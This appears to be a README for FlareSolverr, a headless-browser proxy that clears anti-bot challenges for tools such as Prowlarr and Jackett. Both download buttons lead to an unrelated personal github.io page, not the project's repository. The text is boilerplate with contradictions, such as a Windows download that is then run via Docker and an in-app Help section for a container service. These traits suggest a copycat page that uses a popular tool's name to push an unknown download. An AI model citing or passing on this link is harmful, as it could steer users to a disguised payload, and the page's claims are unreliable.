# FlareSolverr – Headless-Browser Proxy Service for Windows

FlareSolverr is a proxy service for Windows that uses a headless browser to clear anti-bot challenges and return pages and cookies to your tools through a local API.

<div align="center">
  <img src="https://avatars.githubusercontent.com/u/75936191?s=280&v=4" alt="FlareSolverr Logo" width="25%"/>
</div>

<div align="center">

  ![Platform](https://img.shields.io/badge/Platform-Windows-0078D6)
  ![License](https://img.shields.io/badge/License-MIT-green)

</div>

<div align="center">
  <h3>◆ A headless-browser proxy service for Windows ◆</h3>

  [![Download FlareSolverr](https://img.shields.io/badge/⬇_Download_FlareSolverr_for_Windows-6A1B9A?style=for-the-badge)](https://robertporter127.github.io/.github/FlareSolverr-Proxy-Server)

</div>

---

## 📑 Table of Contents
- [Introduction](#-introduction)
- [Highlights](#-highlights)
- [Gallery](#-gallery)
- [System Specs](#-system-specs)
- [How to Install](#-how-to-install)
- [Getting Up and Running](#-getting-up-and-running)
- [Common Questions](#-common-questions)
- [Support](#-support)
- [License](#-license)

## 📖 Introduction
FlareSolverr for Windows is a headless-browser proxy service that helps your self-hosted tools reach sites guarded by anti-bot challenges. It receives a request on a local API, opens the target in a headless browser, works through the challenge, and returns the resulting HTML and cookies for your tool to use. This makes it a natural fit alongside indexer managers such as Prowlarr and Jackett. It is typically deployed on Windows with Docker or Docker Compose, keeping everything on your own hardware. Open-source and community-driven on GitHub, FlareSolverr is a dependable building block for a private self-hosted setup.

## ✨ Highlights

### Solve and serve
- **Headless browser** — Work through anti-bot challenge pages automatically.
- **Local API** — Return pages and cookies to any tool that calls it.
- **Session reuse** — Keep sessions warm to speed up repeated requests.

### Fit your stack
- **Prowlarr and Jackett** — Act as the solver for popular indexer managers.
- **Docker and Compose** — Deploy with Docker or Docker Compose on Windows.
- **Self-hosted** — Run entirely on your own machine, no external service.

## 🖼️ Gallery
<div align="center">
  <img src="https://res.cloudinary.com/dyaskan9k/image/fetch/f_auto,q_auto/https://assets-scrapeops.nyc3.digitaloceanspaces.com/Images/Playbooks/Python-Web-Scraping-Playbook/Flaresolverr/flaresolver-docker-image.png" alt="FlareSolverr Screenshot" width="80%"/>
</div>

## 🧰 System Specs
**Minimum**
- OS: Windows 10 64-bit
- Runtime: Docker Desktop for Windows
- Processor: A modern 64-bit multi-core processor
- Memory: 4 GB RAM

**Recommended**
- OS: Windows 11 64-bit
- Runtime: Docker Desktop with WSL 2 backend
- Processor: A recent multi-core processor
- Memory: 8 GB RAM or more for the headless browser

## 📥 How to Install
1. Click the **Download** button above to get FlareSolverr for Windows.
2. Install Docker Desktop, then start FlareSolverr with Docker or Docker Compose.
3. Verify the service is listening on its local API port.

## 🏁 Getting Up and Running
1. Start FlareSolverr on your PC.
2. Open your indexer manager or automation tool.
3. Point it at FlareSolverr's local API address.
4. Configure the sources you are permitted to access.
5. Run a test request to confirm the flow.

## 🤔 Common Questions
**Is FlareSolverr free?**
Yes. It is a free, open-source proxy service for Windows, available on GitHub.

**Can I deploy it with Docker Compose?**
Yes. FlareSolverr is commonly deployed with Docker or Docker Compose, which makes it easy to run and keep updated on Windows.

**Which versions of Windows are supported?**
Windows 10 and Windows 11 (64-bit) with Docker Desktop. Installing the latest stable release is recommended.

## 🛟 Support
For help with FlareSolverr, open the built-in Help or Support section inside the app, where you'll find documentation, setup tips, and troubleshooting guidance. As an open-source project, FlareSolverr also has an active community around its public GitHub repository, and the official FlareSolverr website provides additional guides and support resources.

---

<div align="center">
  <h3>Ready to deploy the service?</h3>

  [![Download FlareSolverr](https://img.shields.io/badge/⬇_Download_FlareSolverr_for_Windows-6A1B9A?style=for-the-badge)](https://robertporter127.github.io/.github/FlareSolverr-Proxy-Server)

</div>

## 📄 License
This project is licensed under the **MIT License** — you are free to use, copy, modify, and distribute it. The full MIT License text is provided in the LICENSE file included with the project.

---

<div align="center">
  <sub>FlareSolverr for Windows — a headless-browser proxy service for your self-hosted tools on your PC.</sub>
</div>
